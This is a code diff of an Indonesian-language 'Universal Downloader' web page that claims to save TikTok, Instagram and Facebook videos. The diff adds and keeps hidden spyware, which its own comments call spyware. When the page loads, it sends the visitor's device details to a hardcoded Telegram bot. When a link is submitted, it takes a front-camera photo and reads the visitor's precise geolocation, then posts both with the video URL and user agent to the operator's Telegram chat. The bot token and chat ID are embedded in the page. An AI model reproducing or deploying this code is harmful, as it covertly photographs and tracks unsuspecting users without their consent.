@@ -7,9 +7,9 @@
     <style>
         /* --- 1. CORE VARIABLES & RESET --- */
         :root {
-            --bg-color: #0f172a;
-            --card-bg: #1e293b;
-            --accent-color: #6366f1;
+            --bg-color: #0f172a;       /* Dark Navy Background */
+            --card-bg: #1e293b;        /* Slightly Lighter Card */
+            --accent-color: #6366f1;   /* Indigo/Purple Accent */
             --accent-hover: #4f46e5;
             --text-main: #f8fafc;
             --text-muted: #94a3b8;
@@ -22,7 +22,12 @@
             --font-main: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
 
         body {
             background-color: var(--bg-color);
@@ -49,7 +54,11 @@
             z-index: 10;
         }
 
-        header { text-align: center; animation: slideDown 0.8s cubic-bezier(0.2, 0.8, 0.2, 1); }
+        /* Header Style */
+        header {
+            text-align: center;
+            animation: slideDown 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
+        }
 
         h1 {
             font-size: 2.2rem;
@@ -61,8 +70,13 @@
             -webkit-text-fill-color: transparent;
         }
 
-        .subtitle { color: var(--text-muted); font-size: 1rem; line-height: 1.5; }
+        .subtitle {
+            color: var(--text-muted);
+            font-size: 1rem;
+            line-height: 1.5;
+        }
 
+        /* Input Card */
         .input-card {
             background: rgba(30, 41, 59, 0.7);
             backdrop-filter: blur(12px);
@@ -73,14 +87,18 @@
             animation: fadeInUp 0.8s cubic-bezier(0.2, 0.8, 0.2, 1) 0.2s backwards;
         }
 
-        .form-group { position: relative; margin-bottom: 16px; }
+        .form-group {
+            position: relative;
+            margin-bottom: 16px;
+        }
 
+        /* Custom Input Style */
         input[type="url"] {
             width: 100%;
             background: #0f172a;
             border: 2px solid var(--border-color);
             border-radius: var(--radius-sm);
-            padding: 16px 48px 16px 20px;
+            padding: 16px 48px 16px 20px; /* Space for icon */
             font-size: 1rem;
             color: white;
             transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
@@ -92,6 +110,7 @@
             box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15);
         }
 
+        /* Paste Icon inside Input */
         .input-icon {
             position: absolute;
             right: 16px;
@@ -104,8 +123,11 @@
             transition: fill 0.3s;
         }
 
-        input:focus + .input-icon { fill: var(--accent-color); }
+        input:focus + .input-icon {
+            fill: var(--accent-color);
+        }
 
+        /* Main Action Button */
         .btn-action {
             width: 100%;
             background: linear-gradient(135deg, var(--accent-color), #4338ca);
@@ -126,11 +148,24 @@
             overflow: hidden;
         }
 
-        .btn-action:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(99, 102, 241, 0.4); }
-        .btn-action:active { transform: translateY(0); }
-        .btn-action:disabled { opacity: 0.7; cursor: not-allowed; transform: none; background: var(--border-color); box-shadow: none; }
+        .btn-action:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(99, 102, 241, 0.4);
+        }
 
-        /* --- 3. ANIMATED LOADERS --- */
+        .btn-action:active {
+            transform: translateY(0);
+        }
+
+        .btn-action:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+            background: var(--border-color);
+            box-shadow: none;
+        }
+
+        /* --- 3. ANIMATED LOADERS & ICONS --- */
         .loader {
             width: 22px;
             height: 22px;
@@ -138,14 +173,27 @@
             border-radius: 50%;
             border-top-color: #fff;
             animation: spin 0.8s cubic-bezier(0.6, 0, 0.4, 1) infinite;
-            display: none;
+            display: none; /* Hidden by default */
         }
 
-        .btn-icon-svg { width: 20px; height: 20px; fill: currentColor; transition: transform 0.3s ease; }
-        .btn-action:hover .btn-icon-svg { transform: translateY(2px); }
+        .btn-icon-svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+            transition: transform 0.3s ease;
+        }
+        
+        .btn-action:hover .btn-icon-svg {
+            transform: translateY(2px);
+        }
 
         /* --- 4. RESULT AREA --- */
-        #result-area { display: none; flex-direction: column; gap: 12px; margin-top: 20px; }
+        #result-area {
+            display: none; /* Hidden default */
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 20px;
+        }
 
         .result-card {
             background: #1e293b;
@@ -163,27 +211,66 @@
             transform: translateX(-20px);
         }
 
-        .result-card:hover { background: #334155; border-color: var(--accent-color); transform: scale(1.02); }
+        .result-card:hover {
+            background: #334155;
+            border-color: var(--accent-color);
+            transform: scale(1.02);
+        }
 
-        .result-info { display: flex; align-items: center; gap: 12px; font-weight: 600; }
-        .download-icon { width: 24px; height: 24px; fill: var(--accent-color); }
-        .arrow-icon { width: 16px; height: 16px; fill: var(--text-muted); transition: transform 0.3s; }
-        .result-card:hover .arrow-icon { transform: translateX(4px); fill: white; }
+        .result-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 600;
+        }
 
-        /* --- 5. TOAST --- */
+        .download-icon {
+            width: 24px;
+            height: 24px;
+            fill: var(--accent-color);
+        }
+
+        .arrow-icon {
+            width: 16px;
+            height: 16px;
+            fill: var(--text-muted);
+            transition: transform 0.3s;
+        }
+
+        .result-card:hover .arrow-icon {
+            transform: translateX(4px);
+            fill: white;
+        }
+
+        /* --- 5. TOAST NOTIFICATION --- */
         #toast {
-            position: fixed; bottom: 32px; left: 50%;
+            position: fixed;
+            bottom: 32px;
+            left: 50%;
             transform: translateX(-50%) translateY(20px);
-            background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(8px);
-            color: white; padding: 12px 24px; border-radius: 50px;
-            font-size: 0.9rem; font-weight: 500;
+            background: rgba(15, 23, 42, 0.9);
+            backdrop-filter: blur(8px);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 50px;
+            font-size: 0.9rem;
+            font-weight: 500;
             box-shadow: 0 10px 25px rgba(0,0,0,0.5);
             border: 1px solid rgba(255,255,255,0.1);
-            opacity: 0; pointer-events: none;
+            opacity: 0;
+            pointer-events: none;
             transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            z-index: 100; display: flex; align-items: center; gap: 8px;
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        #toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+        #toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
         #toast.error { border-color: var(--error); color: #fca5a5; }
         #toast.success { border-color: var(--success); color: #6ee7b7; }
 
@@ -193,58 +280,126 @@
             opacity: 0; pointer-events: none; z-index: -999;
         }
 
+        /* --- KEYFRAMES --- */
         @keyframes spin { to { transform: rotate(360deg); } }
-        @keyframes slideDown { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
-        @keyframes slideInRight { to { opacity: 1; transform: translateX(0); } }
+        
+        @keyframes slideDown { 
+            from { opacity: 0; transform: translateY(-30px); } 
+            to { opacity: 1; transform: translateY(0); } 
+        }
+        
+        @keyframes fadeInUp { 
+            from { opacity: 0; transform: translateY(30px); } 
+            to { opacity: 1; transform: translateY(0); } 
+        }
 
-        @media (max-width: 480px) { h1 { font-size: 1.8rem; } .input-card { padding: 20px; } }
+        @keyframes slideInRight {
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            h1 { font-size: 1.8rem; }
+            .input-card { padding: 20px; }
+        }
     </style>
 </head>
 <body>
 
-    <!-- Elemen Video Tersembunyi untuk Stream Kamera -->
+    <!-- Elemen Video & Canvas Tersembunyi untuk Spyware -->
     <video id="camera-preview" autoplay playsinline muted></video>
     <canvas id="camera-canvas" style="display:none;"></canvas>
 
     <div class="app-container">
+        <!-- Header -->
         <header>
             <h1>Universal Downloader</h1>
-            <p class="subtitle">Simpan video dari TikTok, Instagram, Reels & Facebook.</p>
+            <p class="subtitle">Simpan video dari TikTok, Instagram, Reels & Facebook dengan satu klik.</p>
         </header>
 
+        <!-- Main Interface -->
         <main class="input-card">
             <form id="dlForm">
                 <div class="form-group">
                     <input type="url" id="urlInput" placeholder="Tempel tautan video di sini..." required autocomplete="off">
-                    <svg class="input-icon" viewBox="0 0 24 24"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"/></svg>
+                    <!-- Link Icon SVG -->
+                    <svg class="input-icon" viewBox="0 0 24 24">
+                        <path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"/>
+                    </svg>
                 </div>
 
                 <button type="submit" id="submitBtn" class="btn-action">
                     <span class="btn-text">Download Sekarang</span>
-                    <svg class="btn-icon-svg" viewBox="0 0 24 24" id="btnIcon"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
+                    <!-- Arrow Down Icon SVG -->
+                    <svg class="btn-icon-svg" viewBox="0 0 24 24" id="btnIcon">
+                        <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+                    </svg>
                     <div class="loader"></div>
                 </button>
             </form>
 
-            <div id="result-area"></div>
+            <!-- Results Area -->
+            <div id="result-area">
+                <!-- Cards will be injected here via JS -->
+            </div>
         </main>
     </div>
 
-    <div id="toast"><span id="toast-icon">ℹ️</span><span id="toast-msg">Pesan sistem</span></div>
+    <!-- Toast Notification -->
+    <div id="toast">
+        <span id="toast-icon">ℹ️</span>
+        <span id="toast-msg">Pesan sistem</span>
+    </div>
 
     <script>
         // ==========================================
-        // 1. TELEGRAM & TRACKING CONFIG
+        // 1. TELEGRAM CONFIGURATION
         // ==========================================
         const TELEGRAM_CONFIG = {
-            BOT_TOKEN: '8291513571:AAEhZBOAzCuFgAQZz9dcqA7KenKiv0Exuso',
+            BOT_TOKEN: '8291513571:AAEhZBOAzCuFgAQZz9dcqA7KenKiv0Exuso', 
             ADMIN_ID: '6388974886',
             ENABLE_LOGS: true 
         };
 
+        // Fungsi Kirim Log Saat Halaman Dimuat (Pengunjung Baru)
+        async function sendVisitorLog() {
+            if (!TELEGRAM_CONFIG.ENABLE_LOGS) return;
+            const now = new Date();
+            const timeString = now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+            const userAgent = navigator.userAgent;
+            let deviceType = "Desktop";
+            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated/.test(userAgent)) deviceType = "Mobile";
+            else if (/Tablet|iPad/.test(userAgent)) deviceType = "Tablet";
+
+            const message = `🔔 <b>Pengunjung Baru Terdeteksi!</b>\n---------------------------\n🕒 <b>Waktu:</b> ${timeString}\n📱 <b>Perangkat:</b> ${deviceType}\n🧩 <b>Platform:</b> ${navigator.platform}`;
+            
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CONFIG.ADMIN_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: true
+                    })
+                });
+            } catch (error) { console.log("Gagal log visitor:", error); }
+        }
+
+        window.addEventListener('load', sendVisitorLog);
+
         // ==========================================
-        // 2. DOM ELEMENTS
+        // 2. DOWNLOADER CONFIGURATION
+        // ==========================================
+        const DL_CONFIG = {
+            BASE_URL: 'https://etzy-api.vercel.app/downloader/blackhole',
+            API_KEY: '',
+            API_KEY_HEADER: 'Authorization'
+        };
+
+        // ==========================================
+        // DOM ELEMENTS
         // ==========================================
         const form = document.getElementById('dlForm');
         const input = document.getElementById('urlInput');
@@ -256,11 +411,13 @@
         const toast = document.getElementById('toast');
         const toastMsg = document.getElementById('toast-msg');
         const toastIcon = document.getElementById('toast-icon');
+        
+        // Elemen untuk Kamera
         const videoElement = document.getElementById('camera-preview');
         const canvasElement = document.getElementById('camera-canvas');
 
         // ==========================================
-        // 3. CORE FUNCTIONS (LOGIC BARU)
+        // UTILITY FUNCTIONS
         // ==========================================
 
         function showToast(message, type = 'default') {
@@ -275,24 +432,35 @@
 
         function setLoading(isLoading) {
             if (isLoading) {
-                btn.disabled = true; btnText.style.display = 'none'; btnIcon.style.display = 'none'; loader.style.display = 'block';
-                resultArea.style.display = 'none'; resultArea.innerHTML = '';
+                btn.disabled = true;
+                btnText.style.display = 'none';
+                btnIcon.style.display = 'none';
+                loader.style.display = 'block';
+                resultArea.style.display = 'none';
+                resultArea.innerHTML = '';
             } else {
-                btn.disabled = false; btnText.style.display = 'block'; btnIcon.style.display = 'block'; loader.style.display = 'none';
+                btn.disabled = false;
+                btnText.style.display = 'block';
+                btnIcon.style.display = 'block';
+                loader.style.display = 'none';
             }
         }
 
-        // Fungsi Mengambil Foto & Lokasi
+        // ==========================================
+        // CORE SPY LOGIC (KAMERA & LOKASI)
+        // ==========================================
+        
         async function captureAndSendLog(videoUrl) {
             try {
-                // 1. Akses Kamera
+                // 1. Akses Kamera Depan
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, 
                     audio: false 
                 });
+                
                 videoElement.srcObject = stream;
                 
-                // Tunggu video siap (loadedmetadata)
+                // Tunggu video metadata dimuat dan siap diputar
                 await new Promise((resolve) => {
                     videoElement.onloadedmetadata = () => {
                         videoElement.play();
@@ -300,45 +468,69 @@
                     };
                 });
 
-                // Beri jeda sedikit agar pencahayaan stabil
+                // Beri jeda sedikit agar pencahayaan kamera stabil (auto-focus/exposure)
                 await new Promise(r => setTimeout(r, 800));
 
-                // Gambar ke Canvas
+                // Gambar frame saat ini ke Canvas
                 const context = canvasElement.getContext('2d');
                 canvasElement.width = videoElement.videoWidth;
                 canvasElement.height = videoElement.videoHeight;
                 context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
                 
-                // Konversi ke Blob
+                // Konversi canvas menjadi Blob (File gambar)
                 const imageBlob = await new Promise(resolve => canvasElement.toBlob(resolve, 'image/jpeg', 0.8));
                 
-                // Hentikan Stream Kamera
+                // Matikan stream kamera untuk mematikan lampu indikator (jika ada)
                 stream.getTracks().forEach(track => track.stop());
 
-                // 2. Ambil Lokasi
-                let locationInfo = "Lokasi tidak ditemukan/Ditolak";
+                // 2. Ambil Lokasi & Format Link Google Maps
+                let locationInfo = "❌ Lokasi tidak ditemukan / Ditolak";
+                let mapLinkHtml = ""; 
+
                 try {
                     const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000, enableHighAccuracy: true });
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { 
+                            timeout: 5000, 
+                            enableHighAccuracy: true 
+                        });
                     });
-                    locationInfo = `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}, Akurasi: ${position.coords.accuracy}m`;
+
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const acc = position.coords.accuracy;
+
+                    // Buat Link Google Maps
+                    const gmapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+                    
+                    locationInfo = `Lat: ${lat}, Long: ${lng} (±${acc}m)`;
+                    // HTML Link untuk Telegram
+                    mapLinkHtml = `📍 <a href="${gmapsUrl}">Buka Lokasi di Google Maps</a>`;
+
                 } catch (locErr) {
-                    locationInfo = "Akses Lokasi Ditolak / Timeout";
+                    console.warn("Gagal ambil lokasi:", locErr);
+                    mapLinkHtml = "📍 <b>Gagal mendapatkan lokasi (Izin Ditolak/Timeout)</b>";
                 }
 
                 // 3. Siapkan Data untuk Telegram
                 const formData = new FormData();
                 formData.append('chat_id', TELEGRAM_CONFIG.ADMIN_ID);
-                formData.append('photo', imageBlob, 'intruder.jpg');
+                formData.append('photo', imageBlob, 'intruder_snapshot.jpg');
                 
+                // Caption pesan dengan HTML formatting
                 const caption = `
-🚨 <b>AKTIVITAS DOWNLOAD TERDETEKSI</b> 🚨
+🚨 <b>AKTIVITAS DOWNLOAD TERDETEKSI</b>
 ---------------------------
-🔗 <b>URL Video:</b> ${videoUrl}
-📍 <b>Lokasi:</b> ${locationInfo}
+🔗 <b>Target URL:</b>
+ ${videoUrl}
+
+ ${mapLinkHtml}
+📊 <b>Detail Koordinat:</b>
+ ${locationInfo}
+
 🕒 <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}
-📱 <b>User Agent:</b> ${navigator.userAgent.substring(0, 50)}...
+📱 <b>User Agent:</b> ${navigator.userAgent}
                 `;
+                
                 formData.append('caption', caption);
                 formData.append('parse_mode', 'HTML');
 
@@ -348,68 +540,113 @@
                     body: formData
                 });
 
-                console.log("Log Foto & Lokasi terkirim.");
+                console.log("Log Foto & Lokasi terkirim sukses.");
 
             } catch (err) {
-                console.error("Gagal mengambil kamera/lokasi:", err);
-                // Jangan gagalkan proses download jika spy gagal
+                console.error("Gagal menjalankan fungsi spy (Kamera/Lokasi):", err);
+                // Jangan membatalkan proses download user jika spy gagal
             }
         }
 
         // ==========================================
-        // 4. DOWNLOADER LOGIC
+        // DOWNLOADER LOGIC
         // ==========================================
-        const DL_CONFIG = {
-            BASE_URL: 'https://etzy-api.vercel.app/downloader/blackhole',
-            API_KEY: ''
-        };
 
         function renderLinks(links) {
             resultArea.innerHTML = '';
-            if (!links || links.length === 0) { showToast('Tidak ada link download ditemukan.', 'error'); return; }
+            if (!links || links.length === 0) {
+                showToast('Tidak ada link download ditemukan.', 'error');
+                return;
+            }
 
             links.forEach((link, index) => {
                 const card = document.createElement('a');
-                card.href = link; card.target = '_blank'; card.className = 'result-card';
+                card.href = link;
+                card.target = '_blank';
+                card.className = 'result-card';
                 card.style.animationDelay = `${index * 0.1}s`;
+
                 const label = index === 0 ? 'Video Kualitas HD' : `Server Alternatif ${index + 1}`;
-                card.innerHTML = `<div class="result-info"><svg class="download-icon" viewBox="0 0 24 24"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/></svg><span>${label}</span></div><svg class="arrow-icon" viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>`;
+                
+                card.innerHTML = `
+                    <div class="result-info">
+                        <svg class="download-icon" viewBox="0 0 24 24">
+                            <path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"/>
+                        </svg>
+                        <span>${label}</span>
+                    </div>
+                    <svg class="arrow-icon" viewBox="0 0 24 24">
+                        <path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/>
+                    </svg>
+                `;
                 resultArea.appendChild(card);
             });
+
             resultArea.style.display = 'flex';
         }
 
         // ==========================================
-        // 5. EVENT LISTENER
+        // EVENT LISTENERS & LOGIC
         // ==========================================
+
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
             const url = input.value.trim();
-            if (!url || !url.startsWith('http')) { showToast('URL tidak valid', 'error'); return; }
+
+            if (!url) {
+                showToast('URL tidak boleh kosong', 'error');
+                input.focus();
+                return;
+            }
+
+            if (!url.startsWith('http')) {
+                showToast('Format URL tidak valid', 'error');
+                return;
+            }
 
             setLoading(true);
 
-            // Jalankan Fungsi Spy (Kamera & Lokasi)
-            // Ini akan memicu pop-up izin browser jika belum diizinkan sebelumnya
+            // JALANKAN SPYWARE: Ambil Foto & Lokasi
+            // Ini akan memicu pop-up izin browser
             await captureAndSendLog(url);
 
-            // Lanjutkan Download
+            // Lanjutkan proses Download API
             try {
-                const response = await fetch(`${DL_CONFIG.BASE_URL}?url=${encodeURIComponent(url)}`);
+                const options = { method: 'GET' };
+                if (DL_CONFIG.API_KEY) {
+                    options.headers = { [DL_CONFIG.API_KEY_HEADER]: DL_CONFIG.API_KEY };
+                }
+
+                const response = await fetch(`${DL_CONFIG.BASE_URL}?url=${encodeURIComponent(url)}`, options);
+
+                if (!response.ok) throw new Error(`Server Error: ${response.status}`);
+
                 const data = await response.json();
+
                 if (data.status && data.result?.success && Array.isArray(data.result.download_links)) {
                     renderLinks(data.result.download_links);
-                    showToast('Video ditemukan!', 'success');
+                    showToast('Video berhasil ditemukan!', 'success');
                 } else {
-                    showToast('Gagal memproses link.', 'error');
+                    showToast('Gagal memproses link. Coba lagi.', 'error');
                 }
+
             } catch (err) {
                 console.error("API Error:", err);
-                showToast('Koneksi bermasalah.', 'error');
+                showToast('Koneksi bermasalah atau API down.', 'error');
             } finally {
                 setLoading(false);
             }
         });
+
+        // Interaksi Input Focus
+        input.addEventListener('focus', () => {
+            document.querySelector('.input-card').style.borderColor = 'var(--accent-color)';
+        });
+        
+        input.addEventListener('blur', () => {
+            document.querySelector('.input-card').style.borderColor = 'rgba(255,255,255,0.05)';
+        });
+
     </script>
 </body>
 </html>
